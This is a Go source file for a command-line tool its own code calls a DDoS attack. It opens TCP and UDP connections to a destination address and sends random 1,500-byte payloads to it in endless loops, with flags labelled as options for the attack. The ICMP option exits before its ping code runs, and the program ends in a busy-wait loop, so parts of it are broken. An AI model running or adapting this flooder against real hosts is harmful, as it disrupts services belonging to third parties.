package main

import (
	"crypto/rand"
	"flag"
	"fmt"
	"log"
	"net"
	"strconv"
	"time"

	"github.com/go-ping/ping"
)

var (
	//destination = "127.0.0.1"
	ports = []int{80, 53, 8080}
	//source      = []string{"127.0.0.1", "192.168.0.1"}
	dataSize = 1500
)

func GenRandomBytes(size uint) (blk []byte, err error) {
	blk = make([]byte, size)
	_, err = rand.Read(blk)
	return
}

func tcp4DDos(source *net.TCPAddr, destination *net.TCPAddr, size uint, interval float64) {
	for conn, err := net.DialTCP("tcp", source, destination); true; {
		time.Sleep(time.Duration(interval) * time.Second)
		if err != nil {
			fmt.Printf("%s	%s -> %s	TCP	%d FAILED\n", time.Now().Format("2006-01-02 15:04:05"), source.String(), destination.String(), size)
			fmt.Println("Reason: " + err.Error())
			continue
		}
		data, _ := GenRandomBytes(size)
		conn.Write(data)
		fmt.Printf("%s	%s -> %s	TCP	%d SUCCESS\n", time.Now().Format("2006-01-02 15:04:05"), source.String(), destination.String(), size)
	}
}

func udp4DDos(source *net.UDPAddr, destination *net.UDPAddr, size uint, interval float64) {
	for conn, err := net.DialUDP("udp", source, destination); true; {
		time.Sleep(time.Duration(interval) * time.Second)
		if err != nil {
			fmt.Printf("%s	%s -> %s	UDP	%d FAILED\n", time.Now().Format("2006-01-02 15:04:05"), source.String(), destination.String(), size)
			fmt.Println("Reason: " + err.Error())
			continue
		}
		data, _ := GenRandomBytes(size)
		conn.Write(data)
		fmt.Printf("%s	%s -> %s	UDP	%d SUCCESS\n", time.Now().Format("2006-01-02 15:04:05"), source.String(), destination.String(), size)
	}
}

func main() {
	var sourceFlag string
	var destinationFlag string

	var intervalTCP float64
	var intervalUDP float64
	var intervalICMP float64

	var tcpEnabled bool
	var udpEnabled bool
	var icmpEnabled bool

	flag.StringVar(&sourceFlag, "source", "127.0.0.1", "Addresses from which the attack will go")
	flag.StringVar(&destinationFlag, "destination", "127.0.0.1", "Addresses through which the attack will go")

	flag.Float64Var(&intervalTCP, "intervalTCP", 3.0, "Interval between sending TCP packet")
	flag.Float64Var(&intervalUDP, "intervalUDP", 3.0, "Interval between sending UDP packet")
	flag.Float64Var(&intervalICMP, "intervalICMP", 3.0, "Interval between sending ICMP packet")

	flag.BoolVar(&tcpEnabled, "tcp", false, "Use TCP for attack")
	flag.BoolVar(&udpEnabled, "udp", false, "Use UDP for attack")
	flag.BoolVar(&icmpEnabled, "icmp", false, "Use ICMP for attack")

	flag.Parse()

	if tcpEnabled {
		src, err := net.ResolveTCPAddr("tcp", sourceFlag+":"+strconv.Itoa(ports[0]))
		if err != nil {
			log.Fatalln(err.Error())
		}
		dest, err := net.ResolveTCPAddr("tcp", destinationFlag+":"+strconv.Itoa(ports[0]))
		if err != nil {
			log.Fatalln(err.Error())
		}
		go func() {
			tcp4DDos(src, dest, uint(dataSize), intervalTCP)
		}()
	}
	if udpEnabled {
		src, err := net.ResolveUDPAddr("udp", sourceFlag+":"+strconv.Itoa(ports[1]))
		if err != nil {
			log.Fatalln(err.Error())
		}
		dest, err := net.ResolveUDPAddr("udp", destinationFlag+":"+strconv.Itoa(ports[1]))
		if err != nil {
			log.Fatalln(err.Error())
		}
		go func() {
			udp4DDos(src, dest, uint(dataSize), intervalUDP)
		}()
	}
	if icmpEnabled {
		return
		pinger, err := ping.NewPinger(destinationFlag)
		pinger.Debug = true
		if err != nil {
			panic(err)
		}
		err = pinger.Run()
		if err != nil {
			panic(err)
		}
	}
	for tcpEnabled || udpEnabled || icmpEnabled {
		continue
	}
}
